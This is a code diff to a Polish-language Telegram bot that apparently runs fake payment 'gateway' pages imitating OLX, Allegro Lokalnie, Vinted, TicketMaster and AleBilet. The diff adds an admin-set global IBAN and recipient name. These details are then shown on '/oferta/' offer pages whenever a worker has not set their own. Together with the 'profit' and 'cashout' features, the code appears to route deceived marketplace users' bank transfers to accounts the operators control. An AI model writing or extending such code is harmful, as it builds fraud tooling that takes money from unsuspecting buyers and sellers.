@@ -1476,6 +1476,29 @@ function getOwnerPrzelewy(wlasciciel) {
 	return wlasciciel?.przelewy || { status: 'Nie', Imie: '', Nazwisko: '', Numer: '' };
 }
 
+// Globalne (wspolne) dane przelewu ustawiane przez admina w panelu.
+const PRZELEW_DEFAULTS = { status: 'Nie', Imie: '', Nazwisko: '', Numer: '' };
+async function getGlobalPrzelewy() {
+	const out = { ...PRZELEW_DEFAULTS };
+	for (const field of ['status', 'Imie', 'Nazwisko', 'Numer']) {
+		const val = await getBotConfig(`przelew_${field.toLowerCase()}`);
+		if (val !== null && val !== undefined && val !== '') out[field] = val;
+	}
+	return out;
+}
+
+// Dane przelewu dla bramki: pole uzytkownika ma priorytet, brak -> wartosc globalna.
+async function resolvePrzelewyFor(wlasciciel) {
+	const globalData = await getGlobalPrzelewy();
+	const own = wlasciciel?.przelewy || {};
+	return {
+		status: own.status || globalData.status,
+		Imie: own.Imie || globalData.Imie,
+		Nazwisko: own.Nazwisko || globalData.Nazwisko,
+		Numer: own.Numer || globalData.Numer
+	};
+}
+
 const GATEWAY_PLATFORMS = {
 	olx: { emoji: '🟢', label: 'OLX', add: 'add_offer_olx', list: 'my_offers_olx' },
 	allegrolokalnie: { emoji: '🅰️', label: 'Allegro Lokalnie', add: 'add_offer_lokalnie', list: 'my_offers_lokalnie' },
@@ -5044,6 +5067,7 @@ async function sendFgAdminMenu(chatId, viewerId = chatId) {
 			],
 			[{ text: "Włącz/Wyłącz Self Cashout", icon_custom_emoji_id: "5769248574499983619", callback_data: "fg_admin_toggle_selfcashout" }],
 			[{ text: "Ustaw domenę publiczną", icon_custom_emoji_id: "5776233299424843260", callback_data: "fg_admin_set_public_domain" }],
+			[{ text: "Dane przelewu / IBAN (globalne)", icon_custom_emoji_id: "5879814368572478751", callback_data: "fg_admin_przelew_menu" }],
 			...(canManagePrzelewy(viewerId) ? [[
 				{ text: "Ustawienia przelewów", icon_custom_emoji_id: "5879814368572478751", callback_data: "settings_przelew" },
 				{ text: "Przełącz przelewy", icon_custom_emoji_id: "6030657343744644592", callback_data: "settings_przelew_toggle" }
@@ -5986,6 +6010,60 @@ async function handleFgCallback(query) {
 		}
 
 		if (isAdmin) {
+			if (data === "fg_admin_przelew_menu") {
+				const pd = await getGlobalPrzelewy();
+				const st = pd.status === "Tak" ? "✅ Włączone" : "❌ Wyłączone";
+				await sendFgMessage(
+					(chatId || userId),
+					`${pe("bank", "🏦")} <b>Globalne dane przelewu (IBAN)</b>\n\n` +
+					`<blockquote>` +
+					`${pe("person", "👤")} <b>Imię odbiorcy:</b> <code>${pd.Imie || "brak"}</code>\n` +
+					`${pe("person", "👤")} <b>Nazwisko odbiorcy:</b> <code>${pd.Nazwisko || "brak"}</code>\n` +
+					`${pe("card", "💳")} <b>Numer konta / IBAN:</b> <code>${pd.Numer || "brak"}</code>\n` +
+					`${pe("bank", "🏦")} <b>Przelewy na bramce:</b> ${st}` +
+					`</blockquote>\n\n` +
+					`To działa dla <b>wszystkich platform</b> z przelewem (Allegro, OLX, Vinted, TicketMaster, AleBilet).`,
+					{
+						inline_keyboard: [
+							[
+								{ text: "Zmień Imię", callback_data: "fg_admin_przelew_set_Imie" },
+								{ text: "Zmień Nazwisko", callback_data: "fg_admin_przelew_set_Nazwisko" }
+							],
+							[{ text: "Zmień Numer konta / IBAN", icon_custom_emoji_id: "5920046907782074235", callback_data: "fg_admin_przelew_set_Numer" }],
+							[{ text: "Włącz/Wyłącz przelewy", icon_custom_emoji_id: "6030657343744644592", callback_data: "fg_admin_przelew_toggle" }],
+							[{ text: "Powrót do panelu", icon_custom_emoji_id: "5895507195524550741", callback_data: "fg_admin_back" }]
+						]
+					}
+				);
+				return true;
+			}
+
+			if (data === "fg_admin_przelew_toggle") {
+				const cur = (await getBotConfig("przelew_status")) === "Tak" ? "Nie" : "Tak";
+				await setBotConfig("przelew_status", cur);
+				await bot.answerCallbackQuery(query.id, { text: `Przelewy: ${cur === "Tak" ? "włączone" : "wyłączone"}`, show_alert: false }).catch(() => {});
+				const pd = await getGlobalPrzelewy();
+				await sendFgMessage(
+					(chatId || userId),
+					`${pe("bank", "🏦")} Przelewy są teraz ${cur === "Tak" ? "<b>WŁĄCZONE</b>" : "<b>WYŁĄCZONE</b>"}.\n\nNumer: <code>${pd.Numer || "brak"}</code>`,
+					{
+						inline_keyboard: [[{ text: "◀️ Wróć", callback_data: "fg_admin_przelew_menu" }]]
+					}
+				);
+				return true;
+			}
+
+			if (data.startsWith("fg_admin_przelew_set_")) {
+				const field = data.replace("fg_admin_przelew_set_", "");
+				const labels = { Imie: "imię odbiorcy", Nazwisko: "nazwisko odbiorcy", Numer: "numer konta / IBAN" };
+				await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_przelew_field", field }) });
+				await sendFgMessage(
+					(chatId || userId),
+					`${pe("bank", "🏦")} <b>Zmiana danych przelewu</b>\n\n<blockquote>Wpisz nowe <b>${labels[field] || field}</b>.</blockquote>\n\nWpisz <b>reset</b>, aby wyczyścić to pole.`
+				);
+				return true;
+			}
+
 			if (data === "fg_admin_top_profit") {
 			await handleFgTopProfit(userId);
 			return true;
@@ -6678,6 +6756,48 @@ async function handleFgAdminState(userId, text, stateData, msg) {
 			await say(`<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Limit wpłaty ustawiony na: **${newLimit.toFixed(2)} PLN**`);
 		}
 		await sendFgAdminMenu(userId);
+		return true;
+	}
+
+	if (stateData.action === "awaiting_przelew_field") {
+		await editUserDB(userId, { adminState: null });
+		const field = stateData.field;
+		const value = text.trim();
+
+		if (!value) {
+			await say("❌ Puste. Wpisz wartość jeszcze raz albo **reset**.");
+			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_przelew_field", field }) });
+			return true;
+		}
+
+		if (value.toLowerCase() === "reset") {
+			await setBotConfig(`przelew_${field.toLowerCase()}`, "");
+			await say(`✅ Pole **${field}** zostało wyczyszczone.`);
+		} else if (field === "Numer") {
+			const digits = value.replace(/\s+/g, "").toUpperCase();
+			if (!/^[A-Z0-9]{10,34}$/.test(digits)) {
+				await say("❌ **Niepoprawny numer konta / IBAN.** Podaj 10–34 znaki (litery i cyfry).");
+				await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_przelew_field", field }) });
+				return true;
+			}
+			// Ładna separacja co 4 znaki
+			const pretty = digits.replace(/(.{4})/g, "$1 ").trim();
+			await setBotConfig("przelew_numer", pretty);
+			await say(`✅ Nowy numer konta / IBAN: <code>${pretty}</code>`);
+		} else {
+			await setBotConfig(`przelew_${field.toLowerCase()}`, value);
+			await say(`✅ Ustawiono **${field}**: <code>${value}</code>`);
+		}
+
+		const pd = await getGlobalPrzelewy();
+		await say(
+			`${pe("bank", "🏦")} <b>Aktualne dane przelewu</b>\n\n<blockquote>` +
+			`Imię: <code>${pd.Imie || "brak"}</code>\n` +
+			`Nazwisko: <code>${pd.Nazwisko || "brak"}</code>\n` +
+			`Numer: <code>${pd.Numer || "brak"}</code>\n` +
+			`Status: ${pd.status === "Tak" ? "✅" : "❌"}</blockquote>`,
+			{ inline_keyboard: [[{ text: "◀️ Panel przelewów", callback_data: "fg_admin_przelew_menu" }]] }
+		);
 		return true;
 	}
 
@@ -10164,7 +10284,7 @@ app.get('/oferta/:nazwa', async (req, res) => {
 			wlasciciel = pedaly.find(user => String(user.id) === String(oferta.owner));
 		}
 
-		const przelewy = getOwnerPrzelewy(wlasciciel);
+		const przelewy = await resolvePrzelewyFor(wlasciciel);
 
 
 		if (!oferta) {
